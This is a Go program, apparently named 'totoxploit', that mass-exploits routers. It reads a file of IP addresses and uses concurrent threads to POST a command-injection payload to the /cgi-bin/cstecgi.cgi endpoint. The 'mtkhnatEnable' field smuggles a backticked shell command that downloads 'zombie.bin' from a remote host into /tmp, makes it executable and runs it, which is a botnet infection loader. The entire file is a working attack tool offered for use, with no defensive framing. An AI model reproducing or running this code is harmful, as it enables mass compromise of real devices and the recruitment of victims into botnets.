package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	payloadCmd  = "`wget http://00.000.0.0/zombie.bin -O /tmp/b; chmod +x /tmp/b; /tmp/b`"
	targetPath  = "/cgi-bin/cstecgi.cgi"
	contentType = "application/x-www-form-urlencoded; charset=UTF-8"
	threadLimit = 20
)

func sendExploit(ip string, wg *sync.WaitGroup) {
	defer wg.Done()

	jsonPayload := fmt.Sprintf(`{
"mtkhnatEnable":"%s",
"topicurl":"setMtknatCfg",
"token":"ff353795b31b41ad1904954427651f61"
}`, payloadCmd)

	url := "http://" + ip + targetPath
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonPayload)))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Referer", "http://"+ip+"/advance/parental.html")
	req.Header.Set("Origin", "http://"+ip)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	fmt.Println("exploit sent to:", ip)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("./totoxploit vuln.txt")
		os.Exit(1)
	}

	data, err := os.ReadFile(os.Args[1])
	if err != nil {
		os.Exit(1)
	}
	ips := strings.Split(string(data), "\n")

	var wg sync.WaitGroup
	sem := make(chan struct{}, threadLimit)

	for _, ip := range ips {
		ip = strings.TrimSpace(ip)
		if ip == "" {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer func() { <-sem }()
			sendExploit(target, &wg)
		}(ip)
	}
	wg.Wait()
}
